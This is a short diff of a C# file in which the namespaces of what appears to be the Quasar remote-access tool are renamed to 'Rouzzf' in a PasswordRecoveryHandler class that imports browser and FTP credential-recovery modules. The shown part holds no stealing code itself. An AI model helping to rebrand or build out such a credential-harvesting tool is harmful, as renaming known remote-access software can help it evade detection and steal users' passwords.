@@ -1,14 +1,14 @@
-﻿using Quasar.Client.Recovery;
-using Quasar.Client.Recovery.Browsers;
-using Quasar.Client.Recovery.FtpClients;
-using Quasar.Common.Messages;
-using Quasar.Common.Models;
-using Quasar.Common.Networking;
+﻿using Rouzzf.Client.Recovery;
+using Rouzzf.Client.Recovery.Browsers;
+using Rouzzf.Client.Recovery.FtpClients;
+using Rouzzf.Common.Messages;
+using Rouzzf.Common.Models;
+using Rouzzf.Common.Networking;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 
-namespace Quasar.Client.Messages
+namespace Rouzzf.Client.Messages
 {
     public class PasswordRecoveryHandler : IMessageProcessor
     {
